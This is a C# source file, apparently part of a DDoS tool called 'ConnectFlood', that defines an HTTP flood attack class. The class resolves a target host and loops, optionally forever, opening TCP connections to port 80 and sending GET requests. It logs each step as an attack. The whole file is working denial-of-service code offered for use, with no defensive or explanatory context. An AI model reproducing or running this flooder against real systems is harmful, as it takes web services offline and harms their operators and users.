using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class HttpV1Flood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string host = target;
            if (Uri.IsWellFormedUriString(target, UriKind.Absolute))
            {
                Uri uri = new Uri(target);
                host = uri.Host;
            }
            IPAddress ipAddr;
            if (!IPAddress.TryParse(host, out ipAddr))
            {
                try
                {
                    ipAddr = Dns.GetHostEntry(host).AddressList[0];
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error occurred while resolving host: {ex.Message}");
                    return;
                }
            }
            Console.WriteLine($"[HTTP] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: 80");

            int sentPackets = 0;
            IPEndPoint httpServer = new IPEndPoint(ipAddr, 80);

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(httpServer);

                        byte[] httpRequest = GenerateHttpRequest();
                        socket.Send(httpRequest);

                        Console.WriteLine($"[HTTP] Packet {sentPackets + 1} sent to {host}:80");
                    }

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[HTTP] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[HTTP] Attack finished.");
        }

        private byte[] GenerateHttpRequest()
        {
            string request = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n";
            return Encoding.ASCII.GetBytes(request);
        }
    }
}
